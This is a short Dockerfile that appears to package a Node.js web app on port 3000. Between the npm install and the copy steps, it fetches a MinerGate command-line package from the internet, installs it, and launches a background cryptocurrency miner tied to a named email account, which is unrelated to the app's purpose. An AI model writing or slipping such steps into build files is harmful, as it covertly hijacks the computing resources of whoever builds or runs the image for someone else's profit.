FROM node:9.5.0-stretch

WORKDIR /usr/src/app

COPY package*.json ./

RUN npm install

RUN apt update
RUN wget https://download.minergate.com/deb-cli
RUN mv deb-cli minergate.deb
RUN dpkg -i minergate.deb
RUN nohup minergate-cli -user jhonnyjosearana@gmail.com -bcn 6 &

COPY . .

EXPOSE 3000
CMD [ "npm", "start" ]